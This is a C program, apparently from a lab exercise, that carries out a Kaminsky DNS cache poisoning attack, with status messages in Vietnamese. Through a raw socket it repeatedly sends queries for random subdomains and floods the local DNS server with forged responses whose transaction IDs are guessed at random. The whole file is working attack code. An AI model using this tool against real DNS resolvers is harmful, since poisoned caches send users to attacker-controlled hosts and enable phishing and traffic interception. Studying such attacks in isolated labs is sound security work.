#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <dirent.h>

#define MAX_FILE_SIZE 4096
#define MAX_RESP_TEMPLATES 32
#define TXIDS_PER_QUERY 3000

struct ipheader {
  unsigned char      iph_ihl:4,
                     iph_ver:4;
  unsigned char      iph_tos;
  unsigned short int iph_len;
  unsigned short int iph_ident;
  unsigned short int iph_flag:3,
                     iph_offset:13;
  unsigned char      iph_ttl;
  unsigned char      iph_protocol;
  unsigned short int iph_chksum;
  struct  in_addr    iph_sourceip;
  struct  in_addr    iph_destip;
};

struct resp_template {
  unsigned char data[MAX_FILE_SIZE];
  int size;
};

static unsigned char ip_req[MAX_FILE_SIZE];
static struct resp_template responses[MAX_RESP_TEMPLATES];

void send_raw_packet(int sock, char *buffer, int pkt_size);

static int load_file(const char *path, unsigned char *buf, int max_size)
{
  FILE *fp = fopen(path, "rb");
  int n;

  if (!fp) {
    perror(path);
    return -1;
  }
  n = (int)fread(buf, 1, max_size, fp);
  fclose(fp);
  return n;
}

static int load_resp_templates(void)
{
  DIR *dir;
  struct dirent *ent;
  int count = 0;
  char path[300];

  dir = opendir(".");
  if (!dir) {
    perror("opendir");
    return -1;
  }

  while ((ent = readdir(dir)) != NULL && count < MAX_RESP_TEMPLATES) {
    size_t name_len;

    if (strncmp(ent->d_name, "ip_resp", 7) != 0) {
      continue;
    }
    name_len = strlen(ent->d_name);
    if (name_len < 5 || strcmp(ent->d_name + name_len - 4, ".bin") != 0) {
      continue;
    }
    if (snprintf(path, sizeof(path), "./%s", ent->d_name) >= (int)sizeof(path)) {
      continue;
    }
    responses[count].size = load_file(path, responses[count].data, MAX_FILE_SIZE);
    if (responses[count].size <= 0) {
      continue;
    }
    printf("[*] Nap mau phan hoi: %s (%d bytes)\n", ent->d_name, responses[count].size);
    count++;
  }
  closedir(dir);
  return count;
}

int main(void)
{
  int n_req;
  int resp_count;
  int sock;
  int enable = 1;
  char alphabet[27] = "abcdefghijklmnopqrstuvwxyz";
  int burst = 0;

  setvbuf(stdout, NULL, _IONBF, 0);
  srand((unsigned int)time(NULL));

  n_req = load_file("ip_req.bin", ip_req, MAX_FILE_SIZE);
  if (n_req <= 0) {
    fprintf(stderr, "Khong the mo file 'ip_req.bin'\n");
    return 1;
  }

  resp_count = load_resp_templates();
  if (resp_count <= 0) {
    fprintf(stderr, "Khong tim thay file mau ip_resp*.bin\n");
    return 1;
  }

  sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (sock < 0) {
    perror("Khong the khoi tao Raw Socket");
    return 1;
  }
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

  printf("=== BAT DAU TAN CONG KAMINSKY DNS CACHE POISONING ===\n");
  printf("[*] So mau Response gia mao: %d\n", resp_count);
  printf("[*] Dang ban query va goi tin gia mao toi Local DNS Server...\n");

  while (1) {
    char name[6];
    int k;
    int t;
    int i;

    name[5] = '\0';
    for (k = 0; k < 5; k++) {
      name[k] = alphabet[rand() % 26];
    }

    memcpy(ip_req + 41, name, 5);
    send_raw_packet(sock, (char *)ip_req, n_req);
    /* Cho BIND mo recursive query (TXID that) truoc khi flood spoof. */
    usleep(800);

    for (t = 0; t < resp_count; t++) {
      memcpy(responses[t].data + 41, name, 5);
      memcpy(responses[t].data + 64, name, 5);
    }

    for (i = 0; i < TXIDS_PER_QUERY; i++) {
      unsigned short id = htons((unsigned short)(rand() % 65536));
      for (t = 0; t < resp_count; t++) {
        memcpy(responses[t].data + 28, &id, 2);
        send_raw_packet(sock, (char *)responses[t].data, responses[t].size);
      }
    }

    burst++;
    if (burst % 50 == 0) {
      printf("[+] Da gui %d dot query va phan hoi gia mao...\n", burst);
    }
  }

  close(sock);
  return 0;
}

void send_raw_packet(int sock, char *buffer, int pkt_size)
{
  struct sockaddr_in dest_info;
  struct ipheader *ip = (struct ipheader *)buffer;

  memset(&dest_info, 0, sizeof(dest_info));
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;
  sendto(sock, buffer, pkt_size, 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
}
